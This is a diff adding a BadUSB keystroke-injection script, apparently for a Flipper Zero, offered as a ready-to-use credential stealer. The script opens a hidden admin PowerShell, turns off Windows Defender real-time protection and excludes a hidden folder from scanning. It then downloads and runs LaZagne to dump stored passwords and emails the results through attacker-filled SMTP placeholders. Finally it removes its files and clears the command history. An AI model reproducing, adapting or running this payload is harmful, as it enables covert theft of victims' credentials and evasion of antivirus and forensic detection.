@@ -1,0 +1,76 @@
+REM Open Powershell as Admin
+DEFAULT_DELAY 300
+DELAY 1000
+GUI r
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFT
+ENTER
+DELAY 1000
+REM
+REM Hide Powershell (Remember to extract Flipper only when it displays 100%)
+STRING PowerShell.exe -WindowStyle hidden
+ENTER
+REM
+REM Disable real time protection
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+REM
+REM Create a tmp directory in Downloads folder
+STRING $dir = "C:\Users\$env:UserName\Downloads\tmp"
+ENTER
+STRING New-Item -ItemType Directory -Path $dir
+ENTER
+REM
+REM Add an exception to Windows Defender for the tmp directory
+STRING Add-MpPreference -ExclusionPath $dir
+ENTER
+REM
+REM Hide the directory
+STRING $hide = Get-Item $dir -Force
+ENTER
+STRING $hide.attributes='Hidden'
+ENTER
+REM
+REM Download the executable (version 2.4.2 is a bit faster, you can change the download link to the latest version)
+STRING Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe" -OutFile "$dir\lazagne.exe"
+ENTER
+REM
+REM Execute lazagne.exe and save output to a file
+STRING & "$dir\lazagne.exe" all > "$dir\output.txt"
+ENTER
+REM
+REM Mail Exfiltration
+STRING $smtp = "INSERT YOUR SMTP HERE"
+ENTER
+STRING $From = "INSERT YOUR EMAIL HERE" 
+ENTER
+STRING $To = "INSERT RECEIVER EMAIL HERE" 
+ENTER
+STRING $Subject = "Zero-Lazagne Report"
+ENTER
+STRING $Body = "Hi, here is the Report"
+ENTER
+STRING $Password = "INSERT YOUR PASSWORD HERE" | ConvertTo-SecureString -AsPlainText -Force
+ENTER
+STRING $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
+ENTER
+REM
+REM Send the mail. Tested without SSl. You can try to add "-Use Ssl" and change the port (465 or 587 based on your SMTP)
+STRING Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 25 -Credential $Credential
+ENTER
+REM
+REM Clean up
+STRING Remove-Item -Path $dir -Recurse -Force
+ENTER
+STRING Set-MpPreference -DisableRealtimeMonitoring $false
+ENTER
+STRING Remove-MpPreference -ExclusionPath $dir
+ENTER
+REM
+REM Remove the script from the system and exit from powershell
+STRING Clear-History
+ENTER
+STRING exit
+ENTER
